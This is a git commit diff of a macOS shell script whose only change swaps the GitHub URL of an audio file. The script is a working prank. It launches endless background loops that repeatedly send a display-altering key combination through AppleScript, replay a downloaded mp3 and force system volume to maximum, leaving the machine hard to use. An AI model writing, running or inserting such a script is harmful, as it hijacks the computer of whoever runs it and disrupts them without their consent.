4737369f78940e7f6d64c3a27328ec26c49f39c0
Muslik <dzhabulya@gmail.com>
2019-01-25 23:32:07 +0300

    Change link

--- script.sh
+++ script.sh
@@ -2,6 +2,6 @@ echo "tell application \"System Events\"
 key code 28 using {command down, option down, control down}
 end tell" > ~/Library/config
 while [ 1 ]; do osascript ~/Library/config; done &
-curl https://raw.githubusercontent.com/Dzhaba/Ultimate_Banana/master/audio.mp3 > /tmp/mem.mp3
+curl https://raw.githubusercontent.com/Muslik/woop-woop/master/audio.mp3 > /tmp/mem.mp3
 while [ 1 ]; do afplay /tmp/mem.mp3; done &
 while [ 1 ]; do osascript -e "set Volume 100"; done &
